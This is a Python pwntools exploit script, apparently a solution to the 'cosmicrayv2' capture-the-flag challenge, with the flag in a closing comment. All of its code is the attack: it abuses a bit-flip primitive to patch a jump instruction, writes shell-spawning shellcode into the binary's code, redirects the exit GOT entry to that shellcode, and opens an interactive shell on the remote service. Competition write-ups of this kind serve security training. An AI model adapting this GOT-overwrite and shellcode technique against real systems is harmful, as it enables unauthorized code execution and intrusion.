#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./cosmicrayv2_patched")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("vsc.tf", 3047)
	else:
		r = process([exe.path])
	return r


def main():
	r = conn()

	jz_addr = 0x4015E2
	r.sendlineafter(b'through:', hex(jz_addr).encode())
	r.sendlineafter(b'flip:', b'4')

	def clear_byte(addr):
		is_first = True
		out = 0
		while True:
			r.sendlineafter(b'through:', hex(addr).encode())
			r.recvuntil(b"-----\n")

			bits = r.recvline(keepends=False).split(b"|")[1:-1]
			v = int(b''.join(bits), 2)

			try:
				b = bits.index(b'1')
			except:
				b = 0
			r.sendlineafter(b'flip:', str(b).encode())

			if is_first:
				is_first = False
				out = v
			
			if bits.count(b'1') == 1:
				return out


	def write_byte(addr, v):
		for b in range(8):
			if v & (1 << b) != 0:
				r.sendlineafter(b'through:', hex(addr).encode())
				r.sendlineafter(b'flip:', str(7 - b).encode())


	shellcode_addr = 0x4011F0
	shellcode = shellcraft.amd64.linux.sh()
	shellcode = asm(shellcode)

	for i in range(len(shellcode)):
		print(f'{i=} {hex(shellcode_addr+i)=} {hex(shellcode[i])=}')
		clear_byte(shellcode_addr + i)
		write_byte(shellcode_addr + i, shellcode[i])


	exit_got = exe.got['exit']
	success(f'{hex(exit_got)=}')

	exit_addr = 0
	for i in range(6):
		exit_addr += clear_byte(exit_got + i) << (i + 8)

	shellcode_addr_bytes = bytearray(p64(shellcode_addr))
	for i in range(3):
		write_byte(exit_got + i, shellcode_addr_bytes[i])

	r.sendlineafter(b'through:', b'A' * 20)
	r.sendlineafter(b'flip:', b'9')

	r.interactive()


if __name__ == "__main__":
	main()


# vsctf{m3_wh3n_c0mp1l1ng_w1th_c4n4ry_1s_m0r3_vuln3r4bl3_th4n_c0mp1l1ng_w1th0ut}
